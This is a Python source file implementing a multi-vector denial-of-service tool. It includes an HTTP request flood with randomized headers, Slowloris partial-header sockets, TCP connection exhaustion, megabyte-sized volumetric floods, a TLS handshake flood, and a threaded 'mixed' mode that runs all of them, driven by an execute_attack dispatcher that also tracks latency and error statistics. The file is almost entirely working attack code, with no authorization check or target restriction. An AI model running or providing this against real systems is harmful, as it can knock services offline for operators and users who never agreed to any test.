import time
import socket
import random
import requests
import threading
import ssl
import multiprocessing
from datetime import datetime
import statistics
from typing import Dict, List, Tuple


def extract_host(target_url: str, default_port: int = 80) -> Tuple[str, int]:
    url_without_scheme = target_url.split('://')[-1]
    host = url_without_scheme.split('/')[0]
    return host, default_port


def update_request_performance(shared_stats: dict, elapsed_time: float):
    try:
        sent = shared_stats.get('requests_sent', 0)
        errors = shared_stats.get('errors', 0)
        rps = sent / elapsed_time if elapsed_time > 0 else 0
        perf = shared_stats.setdefault('request_performance', {})
        perf['requests_per_second'] = rps
        perf['success_failure_ratio'] = ((sent - errors) / sent) if sent else None
        if latencies := shared_stats.get('latency_samples', []):
            perf['latency_min'] = min(latencies)
            perf['latency_avg'] = statistics.mean(latencies)
            perf['latency_max'] = max(latencies)
        perf['error_rate'] = errors / sent if sent else 0
    except Exception:
        pass


def http_flood(target_url: str, duration: int, intensity: int, concurrent_connections: int,
               shared_stats: dict, shared_logs: list):
    start = time.time()
    shared_stats.update({'requests_sent': 0, 'errors': 0,
                         'latency_samples': [], 'http_status_codes': {},
                         'timeout_count': 0,
                         'bandwidth': {'total_data_transferred': 0, 'peak_download': 0, 'download_history': []}})

    user_agents = ['DDoS-Test', 'Mozilla/5.0', 'SaaS-Tool', 'Indie-Tester']
    cache_controls = ['no-cache', 'max-age=0']
    accept_encodings = ['gzip', 'deflate', 'br']
    requested_with = ['XMLHttpRequest', 'Fetch']
    sleep_factor = max(0.05, 1 / intensity)

    while time.time() - start < duration:
        try:
            url = f"{target_url}?r={random.randint(1000, 9999)}"
            headers = {
                'User-Agent': random.choice(user_agents),
                'Cache-Control': random.choice(cache_controls),
                'Accept-Encoding': random.choice(accept_encodings),
                'X-Requested-With': random.choice(requested_with)
            }
            t0 = time.perf_counter()
            res = requests.get(url, headers=headers, timeout=5)
            t1 = time.perf_counter()

            latency = (t1 - t0) * 1000
            lat = shared_stats['latency_samples']
            lat.append(latency)
            if len(lat) > 100: lat.pop(0)

            shared_stats['requests_sent'] += 1
            code_map = shared_stats['http_status_codes']
            code_map[res.status_code] = code_map.get(res.status_code, 0) + 1

            dl = len(res.content)
            bw = shared_stats['bandwidth']
            bw['total_data_transferred'] += dl
            bw['download_history'].append((time.time(), dl))
            bw['peak_download'] = max(bw['peak_download'], dl)

            if shared_stats['requests_sent'] % 100 == 0:
                shared_logs.append(f"{datetime.now().isoformat()} Sent {shared_stats['requests_sent']} requests.")

            time.sleep(sleep_factor)
        except requests.exceptions.Timeout as e:
            shared_stats['timeout_count'] += 1
            shared_stats['errors'] += 1
            shared_logs.append(f"{datetime.now().isoformat()} Timeout: {e}")
        except Exception as e:
            shared_stats['errors'] += 1
            shared_logs.append(f"{datetime.now().isoformat()} HTTP flood error: {e}")

    update_request_performance(shared_stats, time.time() - start)


def slowloris(target_url: str, duration: int, intensity: int, concurrent_connections: int,
              shared_stats: dict, shared_logs: list):
    start = time.time()
    host, port = extract_host(target_url)
    sockets = []
    cm = shared_stats.setdefault('connection_metrics', {'attempts': 0, 'successes': 0, 'active_connections': 0, 'lifetimes': []})

    for _ in range(concurrent_connections):
        try:
            cm['attempts'] += 1
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
            sockets.append((s, time.time()))
            cm['successes'] += 1
            cm['active_connections'] += 1
        except Exception as e:
            shared_stats['errors'] += 1
            shared_logs.append(f"{datetime.now().isoformat()} Slowloris init error: {e}")

    interval = max(0.5, 2 / intensity)
    while time.time() - start < duration:
        for s, _ in sockets:
            try:
                s.send(random.choice([b"X-a: b\r\n", b"X-keep: alive\r\n", b"Keep-Connection: open\r\n"]))
            except Exception as e:
                shared_stats['errors'] += 1
                shared_logs.append(f"{datetime.now().isoformat()} Slowloris keepalive error: {e}")
        time.sleep(interval)

    for s, t0 in sockets:
        try:
            s.close()
            cm['active_connections'] -= 1
            cm['lifetimes'].append(time.time() - t0)
        except:
            pass


def tcp_exhaustion(target_url: str, duration: int, intensity: int, concurrent_connections: int,
                   shared_stats: dict, shared_logs: list):
    start = time.time()
    host, port = extract_host(target_url)
    sockets = []
    cm = shared_stats.setdefault('connection_metrics', {'attempts': 0, 'successes': 0, 'active_connections': 0, 'lifetimes': []})

    for _ in range(concurrent_connections):
        try:
            cm['attempts'] += 1
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            sockets.append((s, time.time()))
            cm['successes'] += 1
            cm['active_connections'] += 1
        except Exception as e:
            shared_stats['errors'] += 1
            shared_logs.append(f"{datetime.now().isoformat()} TCP exhaust init error: {e}")

    while time.time() - start < duration:
        time.sleep(1)

    for s, t0 in sockets:
        try:
            s.close()
            cm['active_connections'] -= 1
            cm['lifetimes'].append(time.time() - t0)
        except:
            pass


def volumetric(target_url: str, duration: int, intensity: int, concurrent_connections: int,
               shared_stats: dict, shared_logs: list):
    start = time.time()
    host, port = extract_host(target_url)
    size = 1024 * 1024 * intensity
    payload = b"0" * size
    shared_stats['bytes_sent'] = 0

    while time.time() - start < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            sent = s.send(payload)
            shared_stats['bytes_sent'] += sent
            s.close()
        except Exception as e:
            shared_stats['errors'] += 1
            shared_logs.append(f"{datetime.now().isoformat()} Volumetric error: {e}")


def tls_handshake_flood(target_url: str, duration: int, intensity: int, concurrent_connections: int,
                        shared_stats: dict, shared_logs: list):
    start = time.time()
    host, _ = extract_host(target_url, default_port=443)
    ctx = ssl.create_default_context()

    while time.time() - start < duration:
        try:
            s = socket.create_connection((host, 443), timeout=5)
            ssl_sock = ctx.wrap_socket(s, server_hostname=host)
            ssl_sock.close()
            shared_stats['requests_sent'] = shared_stats.get('requests_sent', 0) + 1
        except Exception as e:
            shared_stats['errors'] = shared_stats.get('errors', 0) + 1
            shared_logs.append(f"{datetime.now().isoformat()} TLS handshake error: {e}")

def mixed(target_url: str, duration: int, intensity: int, concurrent_connections: int,
          shared_stats: dict, shared_logs: list):
    sub_stats = {
        'http_flood': {},
        'slowloris': {},
        'tcp_exhaustion': {},
        'volumetric': {},
        'tls_handshake': {}
    }
    threads = [
        threading.Thread(target=http_flood, args=(target_url, duration, intensity, concurrent_connections, sub_stats['http_flood'], shared_logs)),
        threading.Thread(target=slowloris, args=(target_url, duration, intensity, concurrent_connections, sub_stats['slowloris'], shared_logs)),
        threading.Thread(target=tcp_exhaustion, args=(target_url, duration, intensity, concurrent_connections, sub_stats['tcp_exhaustion'], shared_logs)),
        threading.Thread(target=volumetric, args=(target_url, duration, intensity, concurrent_connections, sub_stats['volumetric'], shared_logs)),
        threading.Thread(target=tls_handshake_flood, args=(target_url, duration, intensity, concurrent_connections, sub_stats['tls_handshake'], shared_logs))
    ]

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    for key, stats in sub_stats.items():
        shared_stats[key] = stats


def execute_attack(config, shared_stats: dict, shared_logs: list):
    shared_stats['start_time'] = datetime.now().isoformat()
    fn = {
        'http_flood': http_flood,
        'slowloris': slowloris,
        'tcp_exhaustion': tcp_exhaustion,
        'volumetric': volumetric,
        'tls_handshake': tls_handshake_flood,
        'mixed': mixed
    }.get(config.attack_type, http_flood)

    try:
        fn(config.target_url, config.duration, config.intensity, config.concurrent_connections,
           shared_stats, shared_logs)
    except Exception as e:
        shared_logs.append(f"{datetime.now().isoformat()} Execution error: {e}")
    shared_stats['complete'] = True
